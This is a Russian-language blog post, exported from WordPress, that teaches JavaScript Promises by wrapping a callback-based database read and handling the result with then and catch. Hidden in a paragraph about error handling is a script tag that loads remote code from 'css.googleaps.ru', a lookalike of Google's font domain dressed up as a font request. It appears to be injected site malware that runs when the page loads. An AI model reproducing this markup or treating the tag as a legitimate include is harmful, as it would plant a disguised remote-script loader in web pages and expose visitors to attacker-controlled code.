---
layout: post
status: publish
published: true
title: Promise. Работаем с асинхронным JavaScript
author:
  display_name: Maxyc Webber
  login: admin
  email: maxycws@gmail.com
  url: ''
author_login: admin
author_email: maxycws@gmail.com
wordpress_id: 1441
wordpress_url: http://magazine.loc/verstka/promise-%d1%80%d0%b0%d0%b1%d0%be%d1%82%d0%b0%d0%b5%d0%bc-%d1%81-%d0%b0%d1%81%d0%b8%d0%bd%d1%85%d1%80%d0%be%d0%bd%d0%bd%d1%8b%d0%bc-javascript/
date: '2015-06-30 14:47:19 +0200'
date_gmt: '2015-06-30 14:47:19 +0200'
categories:
- Верстка
tags:
- ip
- javascript
- jquery
- js
- forwebdev
comments: []
---
<p>Многие разработчики сталкиваются с проблемой асинхронности в JS, особенно когда из-за неё код превращается кучу колбеков. Даже обычное чтение из базы данных превращается в ужас, потому что весь код обработки данных приходится писать в колбеке.<&#47;p></p>
<h2>Приступим к разбору<&#47;h2></p>
<p><em>Условимся, что функция <code>readDataFromDB<&#47;code> нативная и работает асинхронно.<&#47;em><&#47;p></p>
<p>Так выглядит вызов нашей асинхронной функции:<&#47;p></p>
<pre><code class="language-javascript">readDataFromDB(function(err, data) {<br />
  if(err) {<br />
    &#47;&#47;error handle<br />
  }<br />
  &#47;&#47;other code<br />
});<&#47;code><&#47;pre></p>
<p>Как видно, с отловом ошибок также проблема, так как его реализация пишется прямо в колбеке, что не очень удобно. Почему? Ответ прост: потому что на обработку этой ошибки могут претендовать разные части вашего приложения, как в общем-то и на обработку удачного выполнения чтения.<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;p></p>
<p>Уверен, что от увиденного уже хочется бежать, но есть выход из ситуации! Сразу скажу, что этот выход не решение всех проблем, но он может помочь вам сделать код более понятным и сделать работу с асинхронностью более удобной. С этим нам помогут Promise <em>(промисы || обещания)<&#47;em>.<&#47;p></p>
<p>Немого о том, как работаю промисы. <strong>Промис<&#47;strong> &mdash; обертка над асинхронностью, и логика её такова, что впоследствии получаем два случая: <code>resolve<&#47;code> &mdash; случай, когда всё прошло успешно и <code>reject<&#47;code> &mdash; случай, когда всё прошло менее успешно, т.е. неудачно.<&#47;p></p>
<p>Конструктор промиса выглядит следующим образом:<&#47;p></p>
<pre><code class="language-javascript">Promise(executor);<&#47;code><&#47;pre></p>
<p><code>executor<&#47;code> &mdash; функция, в которую будет заключена асинхронность. Функция-экзекутор на вход принимает два аргумента, те самые <code>resolve<&#47;code> и code>reject<&#47;code>. Аргументы <code>resolve<&#47;code> и <code>reject<&#47;code> являются функциями, которые должны будут быть вызваны, в зависимости от ситуации.<&#47;p></p>
<pre><code class="language-javascript">new Promise(function(resolve, reject) {<br />
  &#47;&#47;do smth<br />
});<&#47;code><&#47;pre></p>
<p>Давайте обернём нашу асинхронную функцию <code>readDataFromDB<&#47;code>в промис:<&#47;p></p>
<pre><code class="language-javascript">&#47;&#47;создаем промис<br />
var p = new Promise(function(resolve, reject) {<br />
  &#47;&#47;вызываем функцию<br />
  readDataFromDB(function(err, data) {<br />
    if(!err) {<br />
      resolve(data);<br />
    } else {<br />
      reject(err);<br />
    }<br />
  });<br />
}); <&#47;code><&#47;pre></p>
<p>Теперь в случае ошибки, вызовется <code>reject<&#47;code>, а в случае удачи вызовется <code>resolve<&#47;code>, в которую передадутся данные.<&#47;p></p>
<p>Что мы получили на данный момент? У нас есть отдельная часть логики, которая может дать нам два варианта ответа, ориентируясь на которые мы будем принимать решения о дальнейших действиях.<&#47;p></p>
<p>Двигаемся дальше. Теперь надо определить обработчики. Для этого существует два метода &mdash; <code>then<&#47;code> и <code>catch<&#47;code>. Оба на вход принимают функцию, в которую будут сообщены данные. Метод <code>then<&#47;code> выполнится в случае, если будет вызван <code>resolve<&#47;code>, соответственно <code>catch<&#47;code>, если будет вызван <code>reject<&#47;code>.<&#47;p></p>
<pre><code class="language-javascript">p.then(function(data) {<br />
  console.log('resolved');<br />
});</p>
<p>p.catch(function(err) {<br />
  console.log('rejected');<br />
});<&#47;code><&#47;pre></p>
<p>Стоит сказать, что метод <code>then<&#47;code> может принимать на вход обработчик для <code>resolve<&#47;code> и <code>reject<&#47;code>.<&#47;p></p>
<p>Вот так, довольно-таки кратко, можно описать работу очень крутого инструмента, который называется Promise.<&#47;p></p>
<p>На данный момент, ещё не все браузеры <a href="https:&#47;&#47;developer.mozilla.org&#47;ru&#47;docs&#47;Web&#47;JavaScript&#47;Reference&#47;Global_Objects&#47;Promise" target="_blank">нативно <&#47;a>поддерживают эту технологию, но её реализации можно встретить в <a href="https:&#47;&#47;api.jquery.com&#47;promise&#47;" target="_blank">jQuery<&#47;a>, <a href="https:&#47;&#47;docs.angularjs.org&#47;api&#47;ng&#47;service&#47;$q" target="_blank">AngularJS<&#47;a>, basis.js и это не весь список.<&#47;p></p>
<p>Запись <a rel="nofollow" href="http:&#47;&#47;forwebdev.ru&#47;javascript&#47;promise-javascript&#47;">Promise. Работаем с асинхронным JavaScript<&#47;a> впервые появилась <a rel="nofollow" href="http:&#47;&#47;forwebdev.ru">For Web<&#47;a>.<&#47;p><br />
Source: http:&#47;&#47;forwebdev.ru</p>
